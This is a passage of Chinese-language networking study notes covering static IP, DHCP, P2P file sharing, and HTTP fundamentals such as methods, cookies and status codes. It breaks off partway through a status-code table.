<h3 id="静态-IP"><a href="#静态-IP" class="headerlink" title="静态 IP"></a>静态 IP</h3><p>&emsp;&emsp;静态 IP 地址（又称固定 IP 地址）是长期分配给一台计算机或网络设备使用的 IP 地址。一般来说，一般是特殊的服务器或者采用专线上网的计算机才拥有固定的 IP 地址而且需要比较昂贵的费用。<br>&emsp;&emsp;静态 IP 是可以直接上网的 IP 段，该 IP 在 ISP 装机时会划分一个 IP 地址给你，让计算机在连接网络时不再自动获取网络地址，避免了网络连接上的困扰，宽带运营商会提供一根一个 IP 地址、子网掩码、网关和 DNS 服务器地址给用户。<strong>在未使用路由器的情况下，只需要把这根入户网线连接到电脑上，并且手动设置电脑上的 IP 地址，这样电脑才能上网。</strong>静态 IP 地址不会改变，并且主要用于互联网上的网站应用或服务。一些游戏者和使用 VOIP 的人往往也倾向于选择静态 IP 地址，因为沟通更容易。<br>&emsp;&emsp;动态 IP 地址和静态 IP 地址相对。其一：为了节省 IP 资源，通过电话拨号、ADSL 虚拟拨号等方式上网的机器是不分配固定 IP 地址的。而是由 ISP 动态临时分配，提高 IP 地址利用率；其二：在局域网中为了客户机设置简便，也常采用动态分配 IP 地址，这意味着您每次连接互联网时得到的 IP 地址是不同的。尽管这不影响您访问互联网，但是您的朋友、用户却不能访问到您。因为，他们不知道您的计算机在哪里。这就像每个人都有一部电话，但您的电话号码天天都在改变。<br>&emsp;&emsp;<strong>之所以出现了静态 IP 和动态 IP，是因为 IP 地址不够用。现在需要上网的人太多了，但是现有的技术条件满足不了所有人同时上网。</strong></p>
<h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><p>&emsp;&emsp;DHCP（动态主机配置协议）是一个局域网的网络协议。指的是由服务器控制一段 IP 地址范围，客户机登录服务器时就可以自动获得服务器分配的 IP 地址和子网掩码。默认情况下，DHCP 作为 Windows Server 的一个服务组件不会被系统自动安装，还需要管理员手动安装并进行必要的配置。<br>&emsp;&emsp;它提供一种机制，称为<strong>即插即用连网</strong>。这种机制允许一台计算机加入新的网络和获取 IP 地址而不用手工参与。</p>
<h4 id="主机连网过程"><a href="#主机连网过程" class="headerlink" title="主机连网过程"></a>主机连网过程</h4><p>&emsp;&emsp;我们知道要上网的话，主机必须要有 IP 地址可以。<br>&emsp;&emsp;需要 IP 地址的主机在启动时就向 DHCP 服务器广播发送<strong>发现报文（将目的 IP 设置为全 1，即<code>255.255.255.255</code>）</strong>。这时，该主机就成为了 DHCP 客户。<br>&emsp;&emsp;发送广播报文是因为现在还不知道 DHCP 服务器在什么地方，所以才要发送发现报文。这台主机因为还没有 IP 地址，所以将 IP 数据报的源 IP 地址设置为全 0。这样在本地网络上的所有主机都能接收到这个广播报文，<strong>但只有 DHCP 服务器才对这广播进行应答</strong>：DHCP 服务器先在其数据库中查找该计算机的配置信息，若找到，则返回找到的信息。若找不到，则从服务器的 <strong>IP 地址池</strong>中取一个地址分配给该计算机。DHCP 服务器的回答报文叫做提供报文，表示提供了 IP 地址等配置信息。<br>&emsp;&emsp;但是，我们并不愿意在每个网络上都设置一个 DHCP 服务器，这样会使 DHCP 服务器的数量太多。因此现在是使每个网络至少有一个 <strong>DHCP 中继代理（通常是一台路由器）</strong>，它配置了 DHCP 服务器的 IP 地址信息。当中继代理收到主机 A 的发现报文后，就以单播方式向 DHCP 服务器转发此报文，并等待其回答。收到 DHCP 服务器回答后，中继代理再把此提供报文发回主机 A。<br>&emsp;&emsp;DHCP 服务器分配给 DHCP 客户的 IP 地址是临时的，因此 DHCP 客户只能在一段时间内使用这个分配到的 IP 地址。DHCP 协议称之为租用期，但并未规定租用期应取为多长或至少为多长，这个数值应由 DHCP 服务器自己决定。</p>
<h4 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h4><ul>
<li>请求租约</li>
<li>提供租约 （所有收到请求报文的DHCP服务器都会回应）</li>
<li>选择 IP 租约 （可能多个 DHCP 服务器都会收到发现报文，所以才要选择）</li>
<li>确认 IP 租约 （DHCP 服务器发送确认报文）</li>
<li>时间过一半，更新租用期</li>
<li>若 DHCP 服务器不同意，停止使用原 IP，客户需要重新发送发现报文。</li>
</ul>
<p>&emsp;&emsp;DHCP 很适合于经常移动位置的计算机。在 Windows 系统下，控制面板/网络，找到某个连接中的网络下面的菜单，找到 TCP/IP 协议后，点击属性按钮，若选择自动获得 IP 地址和自动获得 DNS 服务器地址，就表示的是使用 DHCP 协议。</p>
<h2 id="P2P-应用"><a href="#P2P-应用" class="headerlink" title="P2P 应用"></a>P2P 应用</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>&emsp;&emsp;P2P 应用就是指具有 P2P 体系结构的网络应用，没有固定的服务器，而绝大部分的交互都是使用对等方式（P2P 方式）进行的。<br>&emsp;&emsp;P2P 文件分发不需要使用集中式的媒体服务器，而所有的音频/视频文件都是在普通的互联网用户之间传输的。<br>&emsp;&emsp;这其实是相当于有很多分散在各地的媒体服务器（由普通用户的计算机充当这种媒体服务器）向其他用户提供所要下载的音频/视频文件。<br>&emsp;&emsp;这种 P2P 文件分发方式解决了集中式媒体服务器可能出现的瓶颈问题。</p>
<h3 id="具有集中目录服务器的-P2P-工作方式"><a href="#具有集中目录服务器的-P2P-工作方式" class="headerlink" title="具有集中目录服务器的 P2P 工作方式"></a>具有集中目录服务器的 P2P 工作方式</h3><p>&emsp;&emsp;最早使用 P2P 工作方式的是 Napster（1999 年美国一个大学生写的软件）。利用这个软件可以免费下载各种 MP3 音乐。<br>&emsp;&emsp;Napster 的出现使 MP3 成为网络音乐事实的标准。<br>&emsp;&emsp;Napster 能够搜索音乐文件，能够提供检索功能。所有音乐文件的索引信息都集中存放在 Napster 目录服务器中，这个服务器起索引功能，使用者只要查找目录服务器，就可以知道应从何处下载 MP3 文件。</p>
<h4 id="Napster-的工作原理"><a href="#Napster-的工作原理" class="headerlink" title="Napster 的工作原理"></a>Napster 的工作原理</h4><ol>
<li>运行 Napster 的所有用户，都必须及时向 Napster 的目录服务器报告自己已经存有哪些音乐文件。</li>
<li>Napster 目录服务器就用这些用户信息建立起一个动态数据库，集中存储了所有用户的音乐文件信息（即对象名和向对应的 IP 地址）。</li>
<li>当某个用户想下载某个 MP3 文件时，就向目录服务器发出查询（这个过程依然是传统的客户-服务器方式），目录检索出结果之后向用户返回存放这一文件的计算机 IP 地址，于是这个用户就可以从中选取一个地址下载想要得到的 MP3 文件（这个下载过程就是 P2P 方式）。</li>
<li>可以看出，Napster 的文件传输是分散的（P2P 方式），但文件的定位是集中的（客户-服务器方式）</li>
</ol>
<blockquote>
<p>Napster 网站于 2000 年被迫关闭，罪名：间接侵害版权。</p>
</blockquote>
<h3 id="具有全分布式结构的-P2P-文件共享程序"><a href="#具有全分布式结构的-P2P-文件共享程序" class="headerlink" title="具有全分布式结构的 P2P 文件共享程序"></a>具有全分布式结构的 P2P 文件共享程序</h3><p>&emsp;&emsp;第一代 P2P 文件共享软件 Napster 关闭之后，开始出现了以 Gnutella 为代表的第二代 P2P 文件共享软件。<br>&emsp;&emsp;G 与 N 最大的区别在于不使用集中式的目录服务器进行查询，而是使用洪范法在大量 G 用户之间进行查询。<br>&emsp;&emsp;为了更加有效的在大量用户之间使用 P2P 技术下载共享文件，最近几年已经开发出很多 P2P 文件共享程序，他们使用分散定位和分散传输技术。如 <strong>KaZaA</strong>，<strong>电骡 eMulw</strong>，<strong>比特洪流 BT</strong> 等。</p>
<h4 id="BT-工作原理"><a href="#BT-工作原理" class="headerlink" title="BT 工作原理"></a>BT 工作原理</h4><p>&emsp;&emsp;BT 把从对等方下载文件的数据单元称为文件块，一个文件块的长度是固定不变的。<br>&emsp;&emsp;假如一个用户要获取一个文件（这个用户称之为对等方），一开始它并没有文件块，但新的对等方加入可能使他拥有了一些文件块，并且可以为其他对等方提供数据块。在用户陆续获得多个文件块之后，就可以凑成一整个文件。获取到完整的文件之后，可以选择退出 BT（相当于自私的用户），也可以继续留在 BT（相当于无私的用户）。可以随时加入或退出，即便某个文件还未完全下载完成，可以以后再加入 BT 把剩下的文件块再下载完成。<br>&emsp;&emsp;<strong>因此，从不同的对等方获得不同的数据块，然后组装成整个文件，一般要比仅从一个地方下载整个文件要快很多。</strong><br>&emsp;&emsp;至于 BT 解决的问题：如何准确定位找到所需的文件块？若有多个请求，我先给谁？或者先给哪一个文件块？这个就不展开仔细讲了。</p>
<hr>
<h1 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><ul>
<li>部分内容参考于： <a href="https://juejin.im/post/5cd0438c6fb9a031ec6d3ab2" target="_blank" rel="noopener">前端基础篇之 HTTP 协议</a></li>
<li>本篇文章性质为笔记，总结。</li>
</ul>
<h2 id="Web-及网络基础"><a href="#Web-及网络基础" class="headerlink" title="Web 及网络基础"></a>Web 及网络基础</h2><h3 id="WWW"><a href="#WWW" class="headerlink" title="WWW"></a>WWW</h3><p>&emsp;&emsp;1989 年 3 月，HTTP 诞生了。</p>
<blockquote>
<p>&emsp;&emsp;CERN（欧洲核子研究组织）的蒂姆·伯纳斯-李（TimBerners-Lee）博士提出了一种能让远隔两地的研究者们共享知识的设想。<br>&emsp;&emsp;最初设想的基本理念是：借助多文档之间相互关联形成的超文本（HyperText），连成可相互参阅的 WWW（World Wide Web，万维网）。</p>
</blockquote>
<p>&emsp;&emsp;WWW 这一名称，是 Web 浏览器当年用来浏览超文本的客户端应用程序时的名称。现在则用来表示这一系列的集合，也可简称为 Web。</p>
<blockquote>
<p>&emsp;&emsp;现在已提出了 3 项 WWW 构建技术，分别是：页面的文本标记语言的 HTML（HyperText Markup Language，超文本标记语言）；作为文档传递协议的 HTTP；指定文档所在地址的 URL（Uniform Resource Locator，统一资源定位符）。</p>
</blockquote>
<p>&emsp;&emsp;<strong>总结：WWW = Web = HTML + HTTP + URL。</strong></p>
<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><ul>
<li>HTTP/0.9<br>&emsp;&emsp;HTTP 于 1990 年问世。那时的 HTTP 并没有作为正式的标准被建立。这时的 HTTP 其实含有 HTTP/1.0 之前版本的意思，因此被称为 HTTP/0.9。</li>
<li>HTTP/1.0<br>&emsp;&emsp;HTTP 正式作为标准被公布是在 1996 年的 5 月，版本被命名为 HTTP/1.0，并记载于 RFC1945。虽说是初期标准，但该协议标准至今仍被广泛使用在服务器端。</li>
<li>HTTP/1.1<br>&emsp;&emsp;1997 年 1 月公布的 HTTP/1.1 是目前主流的 HTTP 协议版本。当初的标准是 RFC2068，之后发布的修订版 RFC2616 就是当前的最新版本。</li>
</ul>
<blockquote>
<p>HTTP/2.0 下一篇会讲到。</p>
</blockquote>
<h3 id="网络基础-TCP-IP"><a href="#网络基础-TCP-IP" class="headerlink" title="网络基础 TCP/IP"></a>网络基础 TCP/IP</h3><p>&emsp;&emsp;TCP/IP 是互联网相关的各类协议族的总称。而不是单指 TCP 和 IP 两个协议。</p>
<h4 id="应用层-2"><a href="#应用层-2" class="headerlink" title="应用层"></a>应用层</h4><p>&emsp;&emsp;应用层决定了向用户提供应用服务时通信的活动。</p>
<h4 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h4><p>&emsp;&emsp;传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。<br>&emsp;&emsp;在传输层有两个性质不同的协议：TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）。</p>
<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><p>&emsp;&emsp;<strong>网络层用来处理在网络上流动的数据包。</strong>数据包是网络传输的最小数据单位。该层规定了通过怎样的路径（所谓的传输路线）到达对方计算机，并把数据包传送给对方。<br>&emsp;&emsp;与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线。</p>
<h4 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h4><p>&emsp;&emsp;用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。</p>
<figure class="image-box">
                <img src="16f2281fae8be09a.png" alt title class>
                <p></p>
            </figure>

<h3 id="与-HTTP-关系密切的协议：IP、TCP-和-DNS"><a href="#与-HTTP-关系密切的协议：IP、TCP-和-DNS" class="headerlink" title="与 HTTP 关系密切的协议：IP、TCP 和 DNS"></a>与 HTTP 关系密切的协议：IP、TCP 和 DNS</h3><h4 id="负责传输的-IP-协议"><a href="#负责传输的-IP-协议" class="headerlink" title="负责传输的 IP 协议"></a>负责传输的 IP 协议</h4><blockquote>
<p>IP 协议位于网络层。<br>TCP/IP 协议族中的 IP 指的就是网际协议。<br>可能有人会把 “IP” 和 “IP 地址” 搞混，“IP” 其实是一种协议的名称。</p>
</blockquote>
<p>&emsp;&emsp;IP 协议的作用是把各种数据包传送给对方。但是 IP 协议用什么来确定传输的数据包要发到谁手中在呢？要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是 <strong>IP 地址</strong>和 <strong>MAC 地址</strong>（Media Access ControlAddress）。</p>
<blockquote>
<p>IP 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定地址。<br>IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC 地址基本上不会更改。</p>
</blockquote>
<h5 id="使用-ARP-协议凭借-MAC-地址进行通信"><a href="#使用-ARP-协议凭借-MAC-地址进行通信" class="headerlink" title="使用 ARP 协议凭借 MAC 地址进行通信"></a>使用 ARP 协议凭借 MAC 地址进行通信</h5><p>&emsp;&emsp;ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC 地址。在进行中转时，会利用下一站中转设备的 MAC 地址来搜索下一个中转目标。</p>
<figure class="image-box">
                <img src="16f2295dd89e7ce6.png" alt title class>
                <p></p>
            </figure>

<h4 id="确保可靠性的-TCP-协议"><a href="#确保可靠性的-TCP-协议" class="headerlink" title="确保可靠性的 TCP 协议"></a>确保可靠性的 TCP 协议</h4><p>&emsp;&emsp;TCP 位于传输层，提供可靠的字节流服务。<br>&emsp;&emsp;所谓的字节流服务是指，为了方便传输，将大块数据分割成以报文段为单位的数据包进行管理。而可靠的传输服务是指，能够把数据准确可靠地传给对方。<strong>一言以蔽之，TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够确认数据最终是否送达到对方。</strong></p>
<blockquote>
<p>如何保证数据能到达目标？TCP 协议采用了三次握手策略。</p>
</blockquote>
<h5 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h5><p>&emsp;&emsp;用 TCP 协议把数据包送出去后，TCP 不会对传送后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了 TCP 的标志（flag）—— SYN（synchronize）和 ACK（acknowledgement）。<br>&emsp;&emsp;发送端首先发送一个带 SYN 标志的数据包给对方。接收端收到后，回传一个带有 SYN/ACK 标志的数据包以示传达确认信息。最后，发送端再回传一个带 ACK 标志的数据包，代表“握手”结束。<br>&emsp;&emsp;若在握手过程中某个阶段莫名中断，TCP 协议会再次以相同的顺序发送相同的数据包。</p>
<figure class="image-box">
                <img src="16f229fcabf08800.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;除了上述三次握手，TCP 协议还有其他各种手段来保证通信的可靠性。</p>
<h4 id="DNS-域名解析"><a href="#DNS-域名解析" class="headerlink" title="DNS 域名解析"></a>DNS 域名解析</h4><p>&emsp;&emsp;DNS 在系列 2 已经讲过就不在赘述。</p>
<h4 id="各种协议关系一目了然"><a href="#各种协议关系一目了然" class="headerlink" title="各种协议关系一目了然"></a>各种协议关系一目了然</h4><figure class="image-box">
                <img src="16f22a5f2996c16e.png" alt title class>
                <p></p>
            </figure>

<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><h4 id="绝对-URL-格式"><a href="#绝对-URL-格式" class="headerlink" title="绝对 URL 格式"></a>绝对 URL 格式</h4><figure class="image-box">
                <img src="16f22ad122eb4f74.png" alt title class>
                <p></p>
            </figure>

<ul>
<li>协议方案名。<br>&emsp;&emsp;使用<code>http:</code>或<code>https:</code>等协议方案名获取访问资源时要指定协议类型。不区分字母大小写，最后附一个冒号<code>:</code>。<strong>也可使用<code>data:</code>或<code>javascript:</code>这类指定数据或脚本程序的方案名。</strong></li>
<li>登录信息（认证）<br>&emsp;&emsp;指定用户名和密码作为从服务器端获取资源时必要的登录信息（身份认证）。此项是可选项。</li>
<li>服务器地址<br>&emsp;&emsp;使用绝对 URI 必须指定待访问的服务器地址。地址可以是类似<code>hackr.jp</code>这种 DNS 可解析的名称，或是<code>192.168.1.1</code>这类 IPv4 地址名，还可以是<code>[0:0:0:0:0:0:0:1]</code>这样用方括号括起来的 IPv6 地址名</li>
<li>查询字符串<br>&emsp;&emsp;针对已指定的文件路径内的资源，可以使用查询字符串传入任意参数。此项可选。</li>
<li>片段标识符<br>&emsp;&emsp;使用片段标识符通常可标记出已获取资源中的子资源（文档内的某个位置）。但在 RFC 中并没有明确规定其使用方法。该项也为可选项。</li>
</ul>
<h2 id="简单的-HTTP-基础"><a href="#简单的-HTTP-基础" class="headerlink" title="简单的 HTTP 基础"></a>简单的 HTTP 基础</h2><h3 id="请求报文和响应报文"><a href="#请求报文和响应报文" class="headerlink" title="请求报文和响应报文"></a>请求报文和响应报文</h3><p>&emsp;&emsp;HTTP 协议规定，请求从客户端发出，最后服务器端响应该请求并返回。换句话说，肯定是先从客户端开始建立通信的，服务器端在没有接收到请求之前不会发送响应。</p>
<figure class="image-box">
                <img src="16f262e041400a16.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的。</p>
<figure class="image-box">
                <img src="16f263040dedaf94.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;在起始行开头的 HTTP/1.1 表示服务器对应的 HTTP 版本。紧挨着的 200 OK 表示请求的处理结果的状态码和原因短语）。下一行显示了创建响应的日期时间，是首部字段内的一个属性。接着以一空行分隔，之后的内容称为资源实体的主体。</p>
<h3 id="无状态的-HTTP"><a href="#无状态的-HTTP" class="headerlink" title="无状态的 HTTP"></a>无状态的 HTTP</h3><p>&emsp;&emsp;<strong>HTTP 协议自身不对请求和响应之间的通信状态进行保存。</strong>也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理。  </p>
<blockquote>
<p>为什么要这样做？<br>&emsp;&emsp;使用 HTTP 协议，每当有新的请求发送时，就会有对应的新响应产生。<br>&emsp;&emsp;协议本身并不保留之前一切的请求或响应报文的信息。<br>&emsp;&emsp;这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把 HTTP 协议设计成如此简单的。</p>
</blockquote>
<p>&emsp;&emsp;HTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了 <strong>Cookie 技术</strong>。有了 Cookie 再用 HTTP 协议通信，就可以管理状态了。</p>
<h3 id="请求-URI-定位资源"><a href="#请求-URI-定位资源" class="headerlink" title="请求 URI 定位资源"></a>请求 URI 定位资源</h3><p>&emsp;&emsp;HTTP 协议使用 URI 定位互联网上的资源。正是因为 URI 的特定功能，在互联网上任意位置的资源都能访问到。  </p>
<p>客户请求资源的时候，请求报文需要指定 URL，有以下几种方法：</p>
<ul>
<li>完整请求。<br><code>GET http://hacker.jp/index/html HTTP/1.1</code></li>
<li>在 HOST 写明网络域名或 IP 地址。<br><code>GET /index.htm HTTP/1.1 HOST:hacker.jp</code></li>
<li>此之外，如果不是访问特定资源而是对服务器本身发起请求，可以用一个<code>*</code>来代替请求 URI。<br><code>OPTIONS * HTTP/1.1</code></li>
</ul>
<h3 id="告知服务器意图的-HTTP-方法"><a href="#告知服务器意图的-HTTP-方法" class="headerlink" title="告知服务器意图的 HTTP 方法"></a>告知服务器意图的 HTTP 方法</h3><ul>
<li><p>GET：获取资源。<br>&emsp;&emsp;GET 方法用来请求访问已被 URI 识别的资源。指定的资源经服务器端解析后返回响应内容。<strong>也就是说，如果请求的资源是文本，那就保持原样返回；如果是像 CGI（CommonGateway Interface，通用网关接口）那样的程序，则返回经过执行后的输出结果。</strong></p>
</li>
<li><p>POST：传输实体内容。<br>&emsp;&emsp;虽然用 GET 方法也可以传输实体的主体，但一般不用 GET 方法进行传输，而是用 POST 方法。虽说 POST 的功能与 GET 很相似，但 POST 的主要目的并不是获取响应的主体内容。</p>
</li>
<li><p>PUT：传输文件<br>&emsp;&emsp;PUT 方法用来传输文件。<strong>就像 FTP 协议的文件上传一样，要求在请求报文的主体中包含文件内容，然后保存到请求 URI 指定的位置。</strong></p>
<blockquote>
<p>&emsp;&emsp;但是，鉴于 HTTP/1.1 的 PUT 方法自身不带验证机制，任何人都可以上传文件，存在安全性问题，因此一般的 Web 网站不使用该方法。</p>
</blockquote>
</li>
<li><p>HEAD：获取报文首部<br>&emsp;&emsp;<strong>HEAD 方法和 GET 方法一样</strong>，只是不返回报文主体部分。<strong>用于确认 URI 的有效性及资源更新的日期时间</strong>等。</p>
<figure class="image-box">
                <img src="16f265b3797123f4.png" alt title class>
                <p></p>
            </figure>
</li>
<li><p>DELETE：删除文件<br>&emsp;&emsp;DELETE 方法用来删除文件，是<strong>与 PUT 相反的方法</strong>。DELETE 方法按请求 URI 删除指定的资源。</p>
<blockquote>
<p>&emsp;&emsp;但是，HTTP/1.1 的 DELETE 方法本身和 PUT 方法一样不带验证机制，所以一般的 Web 网站也不使用 DELETE 方法。当配合 Web 应用程序的验证机制，或遵守 REST 标准时还是有可能会开放使用的。</p>
</blockquote>
</li>
<li><p>OPTIONS：询问支持的方法<br>&emsp;&emsp;OPTIONS 方法用来查询针对请求URI指定的资源支持的方法。<br>&emsp;&emsp;响应报文会返回当前服务器所支持的方法：比如<code>Allow:GET,POST,HEAD,OPTIONS</code></p>
</li>
<li><p>TRACE：追踪路径<br>&emsp;&emsp;发送请求时，在<code>Max-Forwards</code>首部字段中填入数值，每经过一个服务器端就将该数字减 1，当数值刚好减到 0 时，就停止继续传输，最后接收到请求的服务器端则返回状态码 200 OK 的响应。<br>&emsp;&emsp;客户端通过 TRACE 方法可以<strong>查询发送出去的请求是怎样被加工修改/篡改的</strong>。这是因为，<strong>请求想要连接到源目标服务器可能会通过代理中转，TRACE 方法就是用来确认连接过程中发生的一系列操作。</strong></p>
<blockquote>
<p>&emsp;&emsp;但是，TRACE 方法本来就不怎么常用，再加上它容易引发 XST（Cross-Site Tracing，跨站追踪）攻击，通常就更不会用到了。</p>
</blockquote>
</li>
<li><p>CONNECT：要求用隧道协议连接代理<br>&emsp;&emsp;CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL（SecureSockets Layer，安全套接层）和 TLS（Transport LayerSecurity，传输层安全）协议把通信内容加密后经网络隧道传输。</p>
<figure class="image-box">
                <img src="16f26666ec9a0100.png" alt title class>
                <p></p>
            </figure>

</li>
</ul>
<h3 id="持久连接节省通信量"><a href="#持久连接节省通信量" class="headerlink" title="持久连接节省通信量"></a>持久连接节省通信量</h3><p>&emsp;&emsp;HTTP 协议的初始版本中，每进行一次 HTTP 通信就要断开一次 TCP 连接。以当年的通信情况来说，因为都是些容量很小的文本传输，所以即使这样也没有多大问题。可随着 HTTP 的普及，文档中包含大量图片的情况多了起来。比如，使用浏览器浏览一个包含多张图片的 HTML 页面时，在发送请求访问 HTML 页面资源的同时，也会请求该 HTML 页面里包含的其他资源。因此，每次的请求都会造成无谓的 TCP 连接建立和断开，增加通信量的开销。<br>&emsp;&emsp;为解决上述 TCP 连接的问题，HTTP/1.1 和一部分的 HTTP/1.0 想出了持久连接（也称为 HTTP keep-alive）的方法。持久连接的特点是，<strong>只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。</strong><br>&emsp;&emsp;持久连接的好处在于减少了 TCP 连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。另外，减少开销的那部分时间，使 HTTP 请求和响应能够更早地结束，这样 Web 页面的显示速度也就相应提高了。</p>
<blockquote>
<p>在 HTTP/1.1 中，所有的连接默认都是持久连接。HTTP/1.0 则不一定。</p>
</blockquote>
<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>&emsp;&emsp;HTTP 是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。<br>&emsp;&emsp;Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态，用来让服务端记住客户端。<br>&emsp;&emsp;<strong>Cookie 会根据从服务器端发送的响应报文内的一个叫做<code>Set-Cookie</code>的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</strong></p>
<figure class="image-box">
                <img src="16f2673e57c07922.png" alt title class>
                <p></p>
            </figure>

<p>过程：</p>
<ul>
<li><p>请求报文（首次请求）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /reader/ HTTP/1.1</span><br><span class="line">HOST: hacker.jp</span><br><span class="line"></span><br><span class="line">首部字段内没有 Cookie 的相关信息</span><br></pre></td></tr></table></figure>
</li>
<li><p>响应报文（服务端生成 Cookie 信息）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">.....</span><br><span class="line">server: Apache &lt;Set-Cookie: sid=12313123121; path=/; .......&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>请求报文（第二次请求）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /image/ HTTP/1.1</span><br><span class="line">Host: hacker.jp</span><br><span class="line">Cookie: sid=12313123121</span><br><span class="line"></span><br><span class="line">这样二次请求的时候，服务端通过 cookie 会记住上一次访问的是谁</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>&emsp;&emsp;状态码的职责是当客户端向服务器端发送请求时，描述返回的请求结果。借助状态码，用户可以知道服务器端是正常处理了请求，还是出现了错误。</p>
<figure class="image-box">
                <img src="16f2689bf46a4d38.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;只要遵守状态码类别的定义，即使改变 RFC2616 中定义的状态码，或服务器端自行创建状态码都没问题。</p>
</blockquote>
<blockquote>
<p>&emsp;&emsp;仅记录在 RFC2616 上的 HTTP 状态码就达 40 种，若再加上 WebDAV 和附加 HTTP 状态码等扩展，数量就达 60 余种。别看种类繁多，实际上经常使用的大概只有 14 种。</p>
</blockquote>
<blockquote>
<p><strong>1XX 消息</strong><br>&emsp;&emsp;这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于 HTTP/1.0 协议中没有定义任何 1xx 状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送 1xx 响应。</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>语义</th>
<th>中文描述</th>
</tr>
</thead>
<tbody><tr>
<td>100</td>
<td>Continue</td>
<td>&emsp;&emsp;客户端应当继续发送请求。这个临时响应是用来通知客户端它的部分请求已经被服务器接收，且仍未被拒绝。客户端应当继续发送请求的剩余部分，或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。</td>
</tr>
<tr>
<td>101</td>
<td>Switching Protocols</td>
<td>&emsp;&emsp;服务器已经理解了客户端的请求，并将通过 Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在 Upgrade 消息头中定义的那些协议。<br>&emsp;&emsp;只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的 HTTP 版本比旧版本更有优势，或者切换到一个实时且同步的协议以传送利用此类特性的资源。</td>
</tr>
<tr>
<td>102</td>
<td>Processing</td>
<td>&emsp;&emsp;由 WebDAV(RFC 2518) 扩展的状态码，代表处理将被继续执行。</td>
</tr>
</tbody></table>
<hr>
<p><strong>2XX 成功</strong><br>&emsp;&emsp;这一类型的状态码，代表请求已成功被服务器接收、理解、并接受。</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>语义</th>
<th>中文描述</th>
</tr>
</thead>
<tbody><tr>
<td>200</td>
<td>OK</td>
<td>&emsp;&emsp;请求已成功，请求所希望的响应头或数据体将随此响应返回。出现此状态码是表示正常状态。</td>
</tr>
<tr>
<td>201</td>
<td>Created</td>
<td>&emsp;&emsp;请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随 Location 头信息返回。假如需要的资源无法及时建立的话，应当返回 ‘202 Accepted’。</td>
</tr>
<tr>
<td>202</td>
<td>Accepted</td>
